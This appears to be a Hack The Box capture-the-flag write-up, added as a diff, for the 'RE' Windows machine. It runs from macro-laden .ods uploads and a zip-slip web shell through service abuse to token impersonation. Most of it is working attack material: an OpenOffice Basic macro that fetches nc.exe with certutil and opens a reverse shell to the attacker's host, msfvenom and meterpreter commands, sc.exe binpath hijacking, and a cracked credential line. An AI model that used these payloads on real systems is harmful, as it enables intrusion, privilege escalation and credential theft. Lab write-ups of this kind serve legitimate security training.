@@ -1,0 +1,386 @@
+User Shell:
+
+First we came to 10.10.10.144
+
+show that there's another sub-domain, so we modified the /etc/hosts
+root@kali:~/Desktop/htb/RE# cat /etc/hosts
+10.10.10.159 docker.registry.htb
+10.10.10.162 staging-order.mango.htb
+10.10.10.144 reblog.htb
+
+
+We could found out that website tell us to upload things that might could bypass yara
+And using smbclient -L //10.10.10.144 we can see there's a smb folder there:
+root@kali:~/Desktop/htb/RE# smbclient -L //10.10.10.144
+Enter WORKGROUP\root's password: 
+
+	Sharename       Type      Comment
+	---------       ----      -------
+	IPC$            IPC       Remote IPC
+	malware_dropbox Disk      
+Reconnecting with SMB1 for workgroup listing.
+do_connect: Connection to 10.10.10.144 failed (Error NT_STATUS_IO_TIMEOUT)
+Failed to connect with SMB1 -- no workgroup available
+
+
+So we could upload evil things here, but remember there's a yara here to detect.
+Follow the website, we shoud upload a .ods file.
+
+I used msfconsole to create a evil .ods payload.
+https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/multi/misc/openoffice_document_macro.md
+msf5 > use exploit/multi/misc/openoffice_document_macro
+msf5 exploit(multi/misc/openoffice_document_macro) > set target 0
+target => 0
+msf5 exploit(multi/misc/openoffice_document_macro) > set FILENAME payload.ods
+FILENAME => payload.ods
+msf5 exploit(multi/misc/openoffice_document_macro) > run
+[*] Exploit running as background job 0.
+[*] Exploit completed, but no session was created.
+
+[*] Started reverse TCP handler on 10.0.2.15:4444 
+[*] Using URL: http://0.0.0.0:8080/RK5Xl62Nx
+[*] Local IP: http://10.0.2.15:8080/RK5Xl62Nx
+[*] Server started.
+[*] Generating our odt file for Apache OpenOffice on Windows (PSH)...
+[*] Packaging directory: /usr/share/metasploit-framework/data/exploits/openoffice_document_macro/Basic
+msf5 exploit(multi/misc/openoffice_document_macro) > [*] Packaging file: Basic/script-lc.xml
+[*] Packaging directory: /usr/share/metasploit-framework/data/exploits/openoffice_document_macro/Basic/Standard
+[*] Packaging file: Basic/Standard/Module1.xml
+[*] Packaging file: Basic/Standard/script-lb.xml
+[*] Packaging file: mimetype
+[*] Packaging file: settings.xml
+[*] Packaging directory: /usr/share/metasploit-framework/data/exploits/openoffice_document_macro/META-INF
+[*] Packaging file: META-INF/manifest.xml
+[*] Packaging file: manifest.rdf
+[*] Packaging file: content.xml
+[*] Packaging directory: /usr/share/metasploit-framework/data/exploits/openoffice_document_macro/Thumbnails
+[*] Packaging file: Thumbnails/thumbnail.png
+[*] Packaging file: meta.xml
+[*] Packaging file: styles.xml
+[*] Packaging directory: /usr/share/metasploit-framework/data/exploits/openoffice_document_macro/Configurations2
+[*] Packaging directory: /usr/share/metasploit-framework/data/exploits/openoffice_document_macro/Configurations2/accelerator
+[*] Packaging file: Configurations2/accelerator/current.xml
+[+] payload.ods stored at /root/.msf4/local/payload.ods
+
+
+And I copy it to my windows as msf.ods.
+
+And Since try lots of payload with cmd.exe and powershell
+the yara keeps filtering it out.
+
+So try this : Cretutil
+https://wsygoogol.github.io/2018/12/17/%E6%94%BB%E5%87%BB%E8%80%85%E5%88%A9%E7%94%A8CertUtil-exe%E6%A4%8D%E5%85%A5%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6/
+
+Basically using the payload here:
+https://github.com/dyloot43/ods/blob/master/odf.xml
+
+But I modified the Basic->Standard->Module1.xml like this:
+
+	Sub OnLoad
+	 MkDir "C:\bug"
+	 If Len(Dir("C:\bug", vbDirectory)) = 0 Then
+     	 Shell("certutil.exe -urlcache -split -f 'http://10.10.14.132:8000/test.exe' .\nc.exe")
+	 End If
+	 Shell("certutil.exe -urlcache -split -f 'http://10.10.14.132:8000/nc.exe' C:\bug\nc.exe")
+	 Shell("C:\bug\nc.exe 10.10.14.132 3344 -e cmd.exe")
+	End Sub
+
+Make the C:\bug to make sure I can read wirte there
+If failure will launch a HTTP request to my kali server.
+OtherWise using the certutil to upload nc.exe and execute it to get a reverse shell.
+
+upload payload to server :
+
+root@kali:~/Desktop/htb/RE/mnt# smbclient //10.10.10.144/malware_dropbox
+Enter WORKGROUP\root's password: 
+Try "help" to get a list of possible commands.
+smb: \> put /root/Desktop/htb/RE/evil_ods/msf_v4.ods evilthings.ods
+putting file /root/Desktop/htb/RE/evil_ods/msf_v4.ods as \evilthings.ods (2.2 kb/s) (average 2.2 kb/s)
+
+
+after that, ur nc listener should catch a reverse shell.
+C:\Users\luke\Desktop>type user.txt
+type user.txt
+FE41736F5B9311E48E48B520D9F384D3
+=======================================================================
+
+Root part:
+
+We still can't get access to web service folder, 
+And we can't find anything interesting with luke account.
+
+Maybe we should su to webservice account to get some progress.
+
+
+First of all , we found that there's an interesting file:
+C:\Users\luke\Documents\process_samples.ps1
+view the code, we'll find out that:
+#& 'C:\Program Files (x86)\WinRAR\Rar.exe' a -ep $process_dir\temp.rar $process_dir\*.ods 2>&1 | Out-Null
+Compress-Archive -Path "$process_dir\*.ods" -DestinationPath "$process_dir\temp.zip"
+$hash = (Get-FileHash -Algorithm MD5 $process_dir\temp.zip).hash
+# Upstream processing may expect rars. Rename to .rar
+Move-Item -Force -Path $process_dir\temp.zip -Destination $files_to_analyze\$hash.rar
+
+Maybe there's a zip slip attack we could confirm?
+We can find Program Files (x86) has WinRAR, but it's empty inside.....
+
+So we find another zip software, named PeaZip, in Program Files.
+
+BUT, I was got hint by someone that we could use zip slip attack, 
+I DUNNO HOW TO CONFIRM the vuln, cause cant find Pascal library were vuln to these github list:
+https://github.com/snyk/zip-slip-vulnerability
+
+PeaZip is an open source software, maybe u can trace code to confirm XD..
+
+Anyway, lets start to craft our zip slip attack.
+
+
+First what can we do with zip slip ? We can do smt like LFI right ?
+can't get an RCE, but write files.
+So ! if we write files to the webservice path, we might drop a web shell and surf it yup ?
+That's how we want to do , using zip slip to drop a webshell, run by webservice, so we could su to webservice account.
+
+
+You could using ur luke shell to do it, or using the old way u got luke user --- upload .ods file 
+Both way r useful, pick one.
+Here I demonstrate the upload .ods file one:
+1.Find the web service html path
+This requesires a bit guess, cause the folder in : C:\inetpub\wwwroot
+blog, ip, and re.
+I guess it's in blog folder, So I wanna zip slip attack here: C:\inetpub\wwwroot\blog\mywebshell.php
+
+2.Craft Our .zip file
+Now we know the path, lets craft our zip slip file!
+The web shell we used(can't get it work with .php so using aspx shell):
+https://www.darknet.org.uk/2014/12/insomniashell-asp-net-reverse-shell-bind-shell/
+
+check the relative path we wanna write to:
+C:\Users\luke\Documents\ods>cd ../../../../inetpub/wwwroot
+cd ../../../../inetpub/wwwroot
+
+C:\inetpub\wwwroot>
+
+ok, four ../to the path we want.
+First , mkdir -p ../../../../inetpub/wwwroot/blog in our kali
+then copy the shell to path
+root@kali:~/Desktop/htb/RE/zipslip# cp ../InsomniaShell.aspx "../../../../inetpub/wwwroot/blog/"
+then zip it
+root@kali:~/Desktop/htb/RE/zipslip# zip -r note.zip "../../../../inetpub/wwwroot/blog/InsomniaShell.aspx"
+Then we follow the process_sample , transfer our .zip to hash.rar
+On windows:
+PS D:\PT\Mywriteups\RE> $hash = (Get-FileHash -Algorithm MD5 note.zip).hash
+PS D:\PT\Mywriteups\RE> Move-Item -Force -Path D:\PT\Mywriteups\RE\note.zip -Destination  D:\PT\Mywriteups\RE\$hash.rar
+
+Now copy the .ods file we created before, made a new uploadshe.ods
+the XML payload is :
+Sub OnLoad
+ Shell("certutil.exe -urlcache -split -f 'http://10.10.14.133:8000/A9E7BE51A530B77DF55E499FDFBE12CB.rar' C:\Users\luke\Documents\ods\A9E7BE51A530B77DF55E499FDFBE12CB.rar")
+End Sub
+
+Now copy both $hash.rar and upload_shell.ods to kali.
+
+Then we upload the ods to dropbox on service:
+root@kali:~/Desktop/htb/RE# smbclient //10.10.10.144/malware_dropbox
+Enter WORKGROUP\root's password: 
+Try "help" to get a list of possible commands.
+smb: \> put /root/Desktop/htb/RE/zipslip/upload_shell.ods shell.ods
+putting file /root/Desktop/htb/RE/zipslip/upload_shell.ods as \shell.ods (0.5 kb/s) (average 0.5 kb/s)
+smb: \> 
+
+and surf to http://reblog.htb/InsomniaShell.aspx
+
+worked :D
+Then using the InsomniaShell to back shell to us, and we got a iis apppool\reblog shell :D
+
+
+After these, we could enum with PowerUp.ps1 or accesschk64.exe to find out that there's a vuln service.
+PowerUp.ps1 method:
+PS C:\temp> wget 10.10.14.133:8000/PowerUp.ps1 -OutFile C:\temp\PowerUp.ps1
+wget 10.10.14.133:8000/PowerUp.ps1 -OutFile C:\temp\PowerUp.ps1
+PS C:\temp> Import-Module .\PowerUp.ps1
+Import-Module .\PowerUp.ps1
+PS C:\temp> Invoke-AllChecks
+
+[*] Checking service permissions...
+
+
+ServiceName   : UsoSvc
+Path          : C:\tmp\nc64.exe 10.10.14.8 8181 -e cmd.exe
+StartName     : LocalSystem
+AbuseFunction : Invoke-ServiceAbuse -Name 'UsoSvc'
+CanRestart    : True
+
+We can see that we could abuse UsoSvc, changing it bin path and restart it to get administrator 
+This is the abuse payload:(should Import PowerUp.ps1 first)
+due to the shell is unstable, I deside to using nc back shell:
+Invoke-ServiceAbuse -Name UsoSvc -Command "C:\bug\nc.exe 10.10.14.133 7788 -e cmd.exe"
+Now we got sysadmin :
+root@kali:~/Desktop/htb/RE# nc -lnvp 7788
+listening on [any] 7788 ...
+connect to [10.10.14.133] from (UNKNOWN) [10.10.10.144] 49767
+Microsoft Windows [Version 10.0.17763.107]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+
+
+BUT, the root.txt is encrpyt by EPS system:
+C:\Users\Administrator\Desktop>type root.txt
+type root.txt
+Access is denied.
+
+C:\Users\Administrator\Desktop>cipher /c C:\Users\Administrator\Desktop\root.txt
+cipher /c C:\Users\Administrator\Desktop\root.txt
+
+ Listing C:\Users\Administrator\Desktop\
+ New files added to this directory will not be encrypted.
+
+E root.txt
+  Compatibility Level:
+    Windows XP/Server 2003
+
+  Users who can decrypt:
+    RE\Administrator [Administrator(Administrator@RE)]
+    Certificate thumbprint: E088 5900 BE20 19BE 6224 E5DE 3D97 E3B4 FD91 C95D 
+
+    coby(coby@RE)
+    Certificate thumbprint: 415E E454 C45D 576D 59C9 A0C3 9F87 C010 5A82 87E0 
+
+  No recovery certificate found.
+
+  Key information cannot be retrieved.
+
+The specified file could not be decrypted.
+
+
+We could use IPPSec's method on HELPLINE, but that's too complicated.
+https://www.youtube.com/watch?v=Vs3oSDlzxwA&t=57m25s
+(btw, I got coby user creds with mimikatz in this video )
+copy:fa88e03e41fdf7b707979c50d57c06cf:championship2005
+
+There's another cool msf module : incognito
+https://www.offensive-security.com/metasploit-unleashed/fun-incognito/
+First we created payloda with msfvenom:
+root@kali:~/Desktop/htb/RE# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.133 LPORT=9000 -f exe -o notetest.exe
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 510 bytes
+Final size of exe file: 7168 bytes
+Saved as: notetest.exe
+
+and upload via luke shell(could do it with admin shell, but it's unstable):
+root@kali:~/Desktop/htb/RE# msfdb run
+
+msf5 > use exploit/multi/handler
+msf5 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp 
+payload => windows/x64/meterpreter/reverse_tcp
+msf5 exploit(multi/handler) > set LHOST tun0
+LHOST => tun0
+msf5 exploit(multi/handler) > set LPORT 9000
+LPORT => 9000
+msf5 exploit(multi/handler) > run
+
+[*] Started reverse TCP handler on 10.10.14.133:9000
+
+
+Now back to luke shell to execute the evil.exe we upload:
+PS C:\temp> Invoke-ServiceAbuse -Name UsoSvc -Command "C:\temp\notetest.exe"
+(Here I suggest using -Command "Invoke-ServiceAbuse -Name UsoSvc -Command "C:\bug\nc.exe 10.10.14.133 7788 -e cmd.exe"")
+(and trigger by shell:C:\temp\notetest.exe)
+(cause box is unstable here)
+
+
+Then we got meterpreter shell:
+[*] Sending stage (206403 bytes) to 10.10.10.144
+[*] Meterpreter session 1 opened (10.10.14.133:9000 -> 10.10.10.144:49778) at 2019-12-14 04:32:10 -0500
+
+meterpreter > use incognito
+Loading extension incognito...Success.
+meterpreter > list_tokens -u
+
+Delegation Tokens Available
+========================================
+Font Driver Host\UMFD-0
+Font Driver Host\UMFD-1
+IIS APPPOOL\ip
+IIS APPPOOL\re
+IIS APPPOOL\REblog
+NT AUTHORITY\IUSR
+NT AUTHORITY\LOCAL SERVICE
+NT AUTHORITY\NETWORK SERVICE
+NT AUTHORITY\SYSTEM
+RE\cam
+RE\coby
+RE\luke
+Window Manager\DWM-1
+
+Impersonation Tokens Available
+========================================
+No tokens available
+
+meterpreter > impersonate_token RE\\coby
+[+] Delegation token available
+[+] Successfully impersonated user RE\coby
+meterpreter > shell
+Process 4368 created.
+Channel 1 created.
+Microsoft Windows [Version 10.0.17763.107]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
+type C:\Users\Administrator\Desktop\root.txt
+1B4FB905423F4AD8D99C731468F7715D
+
+
+
+
+
+accesschk64.exe way:
+accesschk64.exe -accepteula -uvwc * > c:\temp\note.txt
+
+UsoSvc
+  Medium Mandatory Level (Default) [No-Write-Up]
+  RW NT AUTHORITY\SYSTEM
+	SERVICE_ALL_ACCESS
+  RW NT AUTHORITY\SERVICE
+	SERVICE_ALL_ACCESS
+
+
+C:\temp>sc.exe stop UsoSvc
+sc.exe stop UsoSvc
+[SC] ControlService FAILED 1062:
+
+The service has not been started.
+
+
+C:\temp>sc.exe config Usosvc binpath= "C:\temp\nc.exe 10.10.14.133 7788 -e cmd.exe"
+sc.exe config Usosvc binpath= "C:\temp\nc.exe 10.10.14.133 7788 -e cmd.exe"
+[SC] ChangeServiceConfig SUCCESS
+
+C:\temp>sc.exe qc usosvc
+sc.exe qc usosvc
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: usosvc
+        TYPE               : 20  WIN32_SHARE_PROCESS 
+        START_TYPE         : 2   AUTO_START  (DELAYED)
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : C:\temp\nc.exe 10.10.14.133 7788 -e cmd.exe
+        LOAD_ORDER_GROUP   : 
+        TAG                : 0
+        DISPLAY_NAME       : Update Orchestrator Service
+        DEPENDENCIES       : rpcss
+        SERVICE_START_NAME : LocalSystem
+
+C:\temp>sc.exe start UsoSvc
+sc.exe start UsoSvc
+
+
+Got shell.
+Then same using msf to trigger reverse_tcp payload then impersonate_token RE\\coby to it.
+Then u could view root.txt.
+
+DONE.
